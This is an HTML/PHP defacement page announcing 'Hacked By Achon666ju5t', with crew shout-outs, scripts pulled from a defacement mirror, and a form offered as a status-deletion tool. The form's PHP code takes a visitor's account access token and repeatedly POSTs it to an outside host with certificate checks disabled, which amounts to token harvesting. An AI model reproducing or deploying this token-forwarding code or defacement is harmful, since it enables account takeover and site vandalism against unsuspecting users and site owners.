



<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<title>Hacked By Achon666ju5t </title>
	<meta content="$ Achon666ju5t | Extreme Crew $" name="description">
	<meta content="Achon666ju5t, extreme crew, hack, hacking, hacked, deface, security, hacker, hacktivist, pentest, technology, internet, system, islam4bad_H4xor, Deface , Hack , Hacked , BlackHat hackers , Islamabad_H4xor" name="keywords">
	<meta content='Achon666ju5t' name='author'/>
	<meta content='esdnaomi@gmail.com' name='email'/>
	<meta content='all, index, follow' name='robots'/>
	<meta content='all, index, follow' name='googlebot'/>
	<meta content='all, index, follow' name='spiders'/>
	<link rel="shortcut icon" href="http://zonehmirrors.org/defaced/2017/06/24/pustakadiniyah.com/i.imgur.com/aliDOd5.png">
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
<script src="http://zonehmirrors.org/defaced/2017/06/24/pustakadiniyah.com/e-mete.com/js/kdsnow.js"></script>  <style>    body{     background-image: url ('https://scontent.fjkt1-1.fna.fbcdn.net/v/t1.0-9/17426093_1046672688809547_1681074230711439435_n.jpg?oh=7c0bb4498289c6c51e5c8b5ab54eb36c&oe=5955CAA5'); background-repeat: no-repeat; background-attachment: fixed; background-position: top; background-color:#000000; position: relative; background-size:100% 100vh; } .logo { width: 300px; height: 300px; margin: 0 auto; margin-top: 50px; -webkit-filter: drop-shadow(0px 0px 7px #0080FF); filter: drop-shadow(0px 0px 7px #0080FF); } .logo:hover{ width: 300px; height: 300px; -webkit-filter: drop-shadow(0px 0px 10px #0080FF); opacity:0.4; filter:alpha(opacity=40); transition: opacity .2s ease-out; -moz-transition: opacity .2s ease-out; -webkit-transition: opacity .2s ease-out; -o-transition: opacity .2s ease-out; }</style>

<center><pre><font color='green'>Anti Up Status Club!
    ___        __                _____ _____ _____   _       ________ 
   /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_
  / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/
 / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_  
/_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/  
                                              /___/                  
Thank's To :
l0c4lh34rtz - Kupat-Sayur - Mr.BucketHead - D4RKNE55 - Ndivic404 - ./R015 - Monkey B Luffy
Mr.R10T1C404 - Trojanlove - Ccocot - Silen - jje incovers -silentc0ders - Zombie-Root
Index Php - d3xj - Kazuya404 - Mr.Xenophobic - X-Sword - Html404 - SPEEDY-03

<form method=POST>
	<input type=text name=token placeholder="Masukin Token Disini"></input>
	<input type=number name=total placeholder="Jumlah status yang di hapus"></input>
	<input type=submit name=gaskeun value="ANTI UP STATUS CLUB!"></input>
</form>

<?php
if($_POST['gaskeun']){
 function unfriend($token, $jumlah){ 
 	$x = 1;
	while ($x < $jumlah) { 
 	$ch = curl_init();
 	curl_setopt($ch, CURLOPT_URL,"https://eue-tetang.ga/api/index.php");
 	curl_setopt($ch, CURLOPT_POST, true);
 	curl_setopt($ch, CURLOPT_POSTFIELDS, "jenis=delete-status&token=$token&jumlah=$jumlah&method=delete");
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
 	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
 	$hasil = curl_exec($ch);
 	$respone = json_decode($hasil, true);
 	if(!$respone){ echo "isi data terlebih dahulu";
 	}elseif($respone['status'] == 'error')
 	{ 
 		echo "gagal, pesan : $respone[pesan]\n";
 	}else{ 
 		echo "$respone[pesan]\n";
 	} curl_close($ch);
	 $x++;
 	}
}
 $toket = $_POST['token'];
 $total = $_POST['total'];
 $eksekusi = unfriend($toket, $total);
 echo $eksekusi;
 }
 ?>
